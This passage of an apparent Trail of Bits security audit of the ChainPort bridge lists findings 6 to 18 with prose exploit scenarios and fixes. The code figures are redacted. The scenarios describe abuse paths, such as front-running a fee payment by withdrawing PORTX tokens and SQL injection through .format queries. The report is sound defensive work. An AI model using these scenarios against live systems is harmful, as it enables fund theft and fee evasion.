!=) should be used. [REDACTED] Figure 5.1: chainport-backend/project/data/db/port.py#L173 We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario An attacker exploits this awed check to bypass the systems business logic and steal user funds. Recommendations Short term, replace the is not operator with != in the filter indicated above. Long term, to continuously monitor the codebase for reintroductions of this issue, run the python.sqlalchemy.correctness.bad-operator-in-filter.bad-operator-in-f ilter Semgrep rule as part of the CI/CD ow. References  SQLAlchemy: Common Filter Operators  Stack Overow: Select NULL Values in SQLAlchemy", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "6. Several functions receive the wrong number of arguments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several functions in the chainport-backend repository are called with an incorrect number of arguments:  Several functions in the /project/deprecated_files folder  A call to release_tokens_by_maintainer from the rebalance_bridge function (gures 6.1 and 6.2)  A call to generate_redeem_signature from the regenerate_signature function (gures 6.3 and 6.4)  A call to get_next_nonce_for_public_address from the prepare_erc20_transfer_transaction function (gures 6.5 and 6.6)  A call to get_cg_token_address_list from the main function of the le (likely old debugging code) [REDACTED] Figure 6.1: The release_tokens_by_maintainer function is called with four arguments, but at least ve are required. (chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L109-L1 14) [REDACTED] Figure 6.2: The denition of the release_tokens_by_maintainer function (chainport-backend/project/lambdas/release_tokens_by_maintainer.py#L27-L3 4) [REDACTED] Figure 6.3: A call to generate_redeem_signature that is missing the network_id argument (chainport-backend/project/scripts/keys_maintainers_signature/regenerate_ signature.py#L38-L43) [REDACTED] Figure 6.4: The denition of the generate_redeem_signature function (chainport-backend/project/lambdas/sidechain/events_handlers/handle_burn_ event.py#L46-L48) [REDACTED] Figure 6.5: A call to get_next_nonce_for_public_address that is missing the outer_session argument (chainport-backend/project/web3_cp/erc20/prepare_erc20_transfer_transacti on.py#L32-L34) [REDACTED] Figure 6.6: The denition of the get_next_nonce_for_public_address function (chainport-backend/project/web3_cp/nonce.py#L19-L21) [REDACTED] Figure 6.7: A call to get_cg_token_address_list that is missing all three arguments (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L90-91) [REDACTED] Figure 6.8: The denition of the get_cg_token_address_list function (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L37) We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario The release_tokens_by_maintainer function is called from the rebalance_bridge function with the incorrect number of arguments. As a result, the rebalance_bridge function fails if the token balance is over the threshold limit, and the tokens are not moved to a safe address. An attacker nds another aw and is able to steal more tokens than he would have been able to if the tokens were safely stored in another account. Recommendations Short term, x the errors presented in the description of this nding by adding the missing arguments to the function calls. Long term, run pylint or a similar static analysis tool to detect these problems (and others) before the code is committed and deployed in production. This will ensure that if the list of a functions arguments ever changes (which was likely the root cause of this problem), a call that does not match the new arguments will be agged before the code is deployed.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "7. Lack of events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setSignatoryAddress function, which is called in the Validator contract to set the signatory address, does not emit an event providing conrmation of that operation to the contracts caller (gure 7.1). [REDACTED] Figure 7.1: The setSignatoryAddress function in Validator:43-52 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to compromise a quorum of the ChainPort congress voters contract. She then sets a new signatory address. Alice, a ChainPort team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Lack of zero address checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, in the initialize function of the ChainportMainBridge contract, developers can dene the maintainer registry, the congress address for governance, and the signature validator and set their addresses to the zero address. [REDACTED] Figure 8.1: The initialize function of ChainportMainBridge.sol Failure to immediately reset an address that has been set to the zero address could result in unexpected behavior. Exploit Scenario Alice accidentally sets the ChainPort congress address to the zero address when initializing a new version of the ChainportMainBridge contract. The misconguration causes the system to behave unexpectedly, and the system must be redeployed once the misconguration is detected. Recommendations Short term, add zero-value checks to all constructor functions and for all setter arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Document any arguments that are intended to be set to the zero address, highlighting the expected values of those arguments on each chain. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Python type annotations are missing from most functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses Python type annotations; however, their use is sporadic, and most functions are missing them. Exploit Scenario The cg_rest_call function receives the exception argument without specifying its type with a Python type annotation. The get_token_details_by_cg_id function calls cg_rest_call with an object of the incorrect type, an Exception instance instead of an Exception class, causing the program to crash (gure 9.1). [REDACTED] Figure 9.1: chainport-backend/modules/coingecko/api.py#L41-L42 Recommendations Short term, add type annotations to the arguments of every function. This will not prevent the code from crashing or causing undened behavior during runtime; however, it will allow developers to clearly see each arguments expected type and static analyzers to better detect type mismatches. Long term, implement checks in the CI/CD pipeline to ensure that code without type annotations is not accepted.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Use of libraries with known vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end repository uses outdated libraries with known vulnerabilities. We used pip-audit, a tool developed by with support from Google to audit Python environments and dependency trees for known vulnerabilities, and identied two known vulnerabilities in the projects dependencies (as shown in gure 10.1). [REDACTED] Figure 10.1: A list of outdated libraries in the back-end repository Recommendations Short term, update the projects dependencies to their latest versions wherever possible. Use pip-audit to conrm that no vulnerable dependencies remain. Long term, add pip-audit to the projects CI/CD pipeline. Do not allow builds to succeed with dependencies that have known vulnerabilities.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. Use of JavaScript instead of TypeScript ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The ChainPort front end is developed with JavaScript instead of TypeScript. TypeScript is a strongly typed language that compiles to JavaScript. It allows developers to specify the types of variables and function arguments, and TypeScript code will fail to compile if there are type mismatches. Contrarily, JavaScript code will crash (or worse) during runtime if there are type mismatches. In summary, TypeScript is preferred over JavaScript for the following reasons:  It improves code readability; developers can easily identify variable types and the types that functions receive.  It improves security by providing static type checking that catches errors during compilation.  It improves support for integrated development environments (IDEs) and other tools by allowing them to reason about the types of variables. Exploit Scenario A bug in the front-end application is missed, and the code is deployed in production. The bug causes the application to crash, preventing users from using it. This bug would have been caught if the front-end application were written in TypeScript. Recommendations Short term, rewrite newer parts of the application in TypeScript. TypeScript can be used side-by-side with JavaScript in the same application, allowing it to be introduced gradually. Long term, gradually rewrite the whole application in TypeScript.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "12. Use of .format to create SQL queries ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back end builds SQL queries with the .format function. An attacker that controls one of the variables that the function is formatting will be able to inject SQL code to steal information or damage the database. [REDACTED] Figure 12.1: chainport-backend/project/data/db/postgres.py#L4-L24 [REDACTED] Figure 12.2: chainport-backend/project/lambdas/database_monitor/clear_lock.py#L29-L31 None of the elds described above are attacker-controlled, so we set the severity of this nding to informational. However, the use of .format to create SQL queries is an anti-pattern; parameterized queries should be used instead. Exploit Scenario A developer copies the vulnerable code to create a new SQL query. This query receives an attacker-controlled string. The attacker conducts a time-based SQL injection attack, leaking the whole database. Recommendations Short term, use parameterized queries instead of building strings with variables by hand. Long term, create or use a static analysis check that forbids this pattern. This will ensure that this pattern is never reintroduced by a less security-aware developer.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "13. Many rules are disabled in the ESLint conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "There are 34 rules disabled in the front-end eslint conguration. Disabling some of these rules does not cause problems, but disabling others reduces the codes security and reliability (e.g., react/no-unescaped-entities, consistent-return, no-shadow) and the codes readability (e.g., react/jsx-boolean-value, react/jsx-one-expression-per-line). Furthermore, the code contains 46 inline eslint-disable comments to disable specic rules. While disabling some of these rules in this way may be valid, we recommend adding a comment to each instance explaining why the specic rule was disabled. Recommendations Short term, create a list of rules that can be safely disabled without reducing the codes security or readability, document the justication, and enable every other rule. Fix any ndings that these rules may report. For rules that are disabled with inline eslint-disable comments, include explanatory comments justifying why they are disabled.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "14. Congress can lose quorum after manually setting the quorum value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Proposals to the ChainPort congress must be approved by a minimum quorum of members before they can be executed. By default, when a new member is added to the congress, the quorum is updated to be N  1, where N is the number of congress members. [REDACTED] Figure 14.1: smart-contracts/contracts/governance/ChainportCongressMembersRegistry.so l#L98-L119 However, the congress has the ability to overwrite the quorum number to any nonzero number, including values larger than the current membership. [REDACTED] Figure 14.2: smart-contracts//contracts/governance/ChainportCongressMembersRegistry.s ol#L69-L77 If the congress manually lowers the quorum number and later adds a member, the quorum number will be reset to one less than the total membership. If for some reason certain members are temporarily or permanently unavailable (e.g., they are on vacation or their private keys were destroyed), the minimum quorum would not be reached. Exploit Scenario The ChainPort congress is composed of 10 members. Alice submits a proposal to reduce the minimum quorum to six members to ensure continuity while several members take vacations over a period of several months. During this period, a proposal to add Bob as a new member of the ChainPort congress is passed while Carol and Dave, two other congress members, are on vacation. This unexpectedly resets the minimum quorum to 10 members of the 11-person congress, preventing new proposals from being passed. Recommendations Short term, rewrite the code so that, when a new member is added to the congress, the minimum quorum number increases by one rather than being updated to the current number of congress members subtracted by one. Add a cap to the minimum quorum number to prevent it from being manually set to values larger than the current membership of the congress. Long term, uncouple operations for increasing and decreasing quorum values from operations for making congress membership changes. Instead, require that such operations be included as additional actions in proposals for membership changes.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Potential race condition could allow users to bypass PORTX fee payments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "ChainPort fees are paid either as a 0.3% fee deducted from the amount transferred or as a 0.2% fee in PORTX tokens that the user has deposited into the ChainportFeeManager contract. To determine whether a fee should be paid in the base token or in PORTX, the back end checks whether the user has a sucient PORTX balance in the ChainportFeeManager contract. [REDACTED] Figure 15.1: chainport-backend//project/lambdas/fees/fees.py#L219-249 However, the ChainportFeeManager contract does not enforce an unbonding period, a period of time before users can unstake their PORTX tokens. [REDACTED] Figure 15.2: smart-contracts/contracts/ChainportFeeManager.sol#L113-L125 Since pending fee payments are generated as part of deposit, transfer, and burn events but the actual processing is handled by a separate monitor, it could be possible for a user to withdraw her PORTX tokens on-chain after the deposit event has been processed and before the fee payment transaction is conrmed, allowing her to avoid paying a fee for the transfer. Exploit Scenario Alice uses ChainPort to bridge one million USDC from the Ethereum mainnet to Polygon. She has enough PORTX deposited in the ChainportFeeManager contract to cover the $2,000 fee. She watches for the pending fee payment transaction and front-runs it to remove her PORTX from the ChainportFeeManager contract. Her transfer succeeds, but she is not required to pay the fee. Recommendations Short term, add an unbonding period preventing users from unstaking PORTX before the period has passed. Long term, ensure that deposit, transfer, and redemption operations are executed atomically with their corresponding fee payments.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "16. Signature-related code lacks a proper specication and documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "ChainPort uses signatures to ensure that messages to mint and release tokens were generated by the back end. These signatures are not well documented, and the properties they attempt to provide are often unclear. For example, answers to the following questions are not obvious; we provide example answers that could be provided in the documentation of ChainPorts use of signatures:  Why does the signed message contain a networkId eld, and why does it have to be unique? If not, an operation to mint tokens on one chain could be replayed on another chain.  Why does the signed message contain an action eld? The action eld prevents replay attacks in networks that have both a main and side bridge. Without this eld, a signature for minting tokens could be used on a sidechain contract of the same network to release tokens.  Why are both the signature and nonce checked for uniqueness in the contracts? The signatures could be represented in more than one format, which means that storing them is not enough to ensure uniqueness. Recommendations Short term, create a specication describing what the signatures protect against, what properties they attempt to provide (e.g., integrity, non-repudiation), and how these properties are provided.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "17. Cryptographic primitives lack sanity checks and clear function names ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several cryptographic primitives are missing sanity checks on their inputs. Without such checks, problems could occur if the primitives are used incorrectly. The remove_0x function (gure 17.1) does not check that the input starts with 0x. A similar function in the eth-utils library has a more robust implementation, as it includes a check on its input (gure 17.2). [REDACTED] Figure 17.1: chainport-backend/modules/cryptography_2key/signatures.py#L10-L16 [REDACTED] Figure 17.2: ethereum/eth-utils/eth_utils/hexadecimal.py#L43-L46 The add_leading_0 function's name does not indicate that the value is padded to a length of 64 (gure 17.3). [REDACTED] Figure 17.3: chainport-backend/modules/cryptography_2key/signatures.py#L19-L25 The _build_withdraw_message function does not ensure that the beneficiary_address and token_address inputs have the expected length of 66 bytes and that they start with 0x (gure 17.4). [REDACTED] Figure 17.4: chainport-backend/modules/cryptography_2key/signatures.py#L28-62 We did not identify problems in the way these primitives are currently used in the code, so we set the severity of this nding to informational. However, if the primitives are used improperly in the future, cryptographic bugs that can have severe consequences could be introduced, which is why we highly recommend xing the issues described in this nding. Exploit Scenario A developer fails to understand the purpose of a function or receives an input from outside the system that has an unexpected format. Because the functions lack sanity checks, the code fails to do what the developer expected. This leads to a cryptographic vulnerability and the loss of funds. Recommendations Short term, add the missing checks and x the naming issues described above. Where possible, use well-reviewed libraries rather than implementing cryptographic primitives in-house. Long term, review all the cryptographic primitives used in the codebase to ensure that the functions purposes are clear and that functions perform sanity checks, preventing them from being used improperly. Where necessary, add comments to describe the functions purposes.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "18. Use of requests without the timeout argument ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The Python requests library is used in the ChainPort back end without the timeout argument. By default, the requests library will wait until the connection is closed before fullling a request. Without the timeout argument, the program will hang indenitely. The following locations in the back-end code are missing the timeout argument:  chainport-backend/modules/coingecko/api.py#L29  chainport-backend/modules/requests_2key/requests.py#L14  chainport-backend/project/stats/cg_prices.py#L74  chainport-backend/project/stats/cg_prices.py#L95 The code in these locations makes requests to the following websites:  https://api.coingecko.com  https://ethgasstation.info  https://gasstation-mainnet.matic.network If any of these websites hang indenitely, so will the back-end code. Exploit Scenario One of the requested websites hangs indenitely. This causes the back end to hang, and token ports from other users cannot be processed. Recommendations Short term, add the timeout argument to each of the code locations indicated above. This will ensure that the code will not hang if the website being requested hangs. Long term, integrate Semgrep into the CI pipeline to ensure that uses of the requests library always have the timeout argument.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}]